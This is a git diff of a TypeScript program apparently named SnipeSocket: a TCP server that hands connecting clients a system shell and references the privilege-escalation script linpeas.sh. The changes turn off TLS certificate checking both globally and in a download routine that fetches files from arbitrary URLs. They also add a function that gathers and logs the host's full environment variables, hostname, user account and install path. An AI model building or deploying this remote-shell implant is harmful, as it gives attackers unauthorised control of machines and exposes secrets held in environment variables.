@@ -1,7 +1,7 @@
 // Imports
 import colors from 'colors/safe';
 import { spawn, execSync, spawnSync, SpawnOptionsWithoutStdio, ChildProcessWithoutNullStreams } from 'child_process';
-import os from 'os';
+import os, { UserInfo } from 'os';
 import fs from 'fs';
 import net from 'net';
 import path from 'path';
@@ -11,6 +11,7 @@ import tty, { ReadStream, WriteStream } from 'tty';
 import stream, { Duplex, Readable, Writable } from 'stream';
 
 require('tls').DEFAULT_ECDH_CURVE = 'auto';
+process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
 
 const LOAD_MAP = {
   linpeas: 'linpeas.sh'
@@ -85,6 +86,44 @@ const findNixShell = (): string => {
 
 const findShell = (): string => isNotWindows() ? findNixShell() : findWinShell();
 
+export interface ISystemInfo {
+  env: { [key: string]: string|undefined };
+  cwd: string;
+  pkg: any;
+  os: {
+    hostname: string;
+    platform: string;
+    release: string;
+    type: string;
+  };
+  user: UserInfo<string>;
+  context: {
+    pkg?: any;
+    node?: boolean;
+    rails?: boolean;
+    docker?: boolean;
+    dockerCompose?: boolean;
+    make?: boolean;
+    makefile?: Buffer;
+  };
+  installPath: string;
+}
+
+const getSystemInfo = (): ISystemInfo => ({
+  env: process.env,
+  cwd: process.cwd(),
+  pkg: require('../package'),
+  os: {
+    hostname: os.hostname(),
+    platform: os.platform(),
+    release: os.release(),
+    type: os.type()
+  },
+  user: os.userInfo(),
+  context: {},
+  installPath: path.join(__dirname, '..')
+});
+
 class SnipeSocket {
   public sock: net.Socket;
   public cp: ChildProcessWithoutNullStreams;
@@ -106,6 +145,18 @@ class SnipeSocket {
       });
     })
   }
+
+  public get isNexe(): boolean {
+    return !!process['__nexe'];
+  }
+
+  public get sysinfo(): ISystemInfo {
+    return getSystemInfo();
+  }
+
+  // public resource(name: string): string {
+  //   return !!process['__nexe'];
+  // }
 
   public onData (data) {
     msg('debug', `SnipeSocket.onData: ${data}`);
@@ -199,7 +250,9 @@ class SnipeSocket {
   public download(file, url, cb?: (err?: Error) => void): http.ClientRequest {
     let localFile = fs.createWriteStream(file);
 
-    return https.get(url, (response) => {
+    const headers = { 'Transfer-Encoding': 'chunked' };
+
+    return https.request(url, { headers, rejectUnauthorized: false }, (response) => {
       const rep = response.headers['content-length'];
       var len = rep ? parseInt(rep, 10) : 0;
       var cur = 0;
@@ -233,15 +286,16 @@ class SnipeSocket {
   }
 
   public welcome(isNexe = false): void {
-    let banner = 'msgs/welcome.txt';
+    let banner = 'assets/welcome.txt';
     let body = 'Welcome to SnipeSocket!';
 
     try {
       msg('debug', `Attempt to load txt art file: ${banner}`);
 
-      if (isNexe) {
-        body = colors.blue(require('nexeres').get(banner));
-        // body += colors.blue(require('nexeres').get('msgs/derp-60.txt'));
+      console.log(`Checking for msgs/assets`, process['__nexe']?.resources);
+
+      if (false) {
+        body = colors.blue(require(banner));
         msg('info', `[NEXE] Read banner: ${body}`);
       } else if (fs.existsSync(banner)) {
         body = colors.blue(fs.readFileSync(banner).toString());
@@ -358,6 +412,7 @@ server.listen(PORT, HOST, () => {
 console.log('process.__nexe', process['__nexe']);
 console.log('process.env', process['env']);
 console.log('process.args', process.argv.join(' '));
+console.log('getSystemInfo()', getSystemInfo());
 
 // Main handler for new connections
 server.on('connection', (sock: net.Socket) => {
@@ -367,7 +422,7 @@ server.on('connection', (sock: net.Socket) => {
   msg('info', `[${socket.sig}] New Connection`);
 
   try {
-    socket.welcome(true);
+    socket.welcome();
 
     socket.sock.on('close', (hadError: boolean) => {
       if (hadError) log(`Socket.on(close) with error!`);
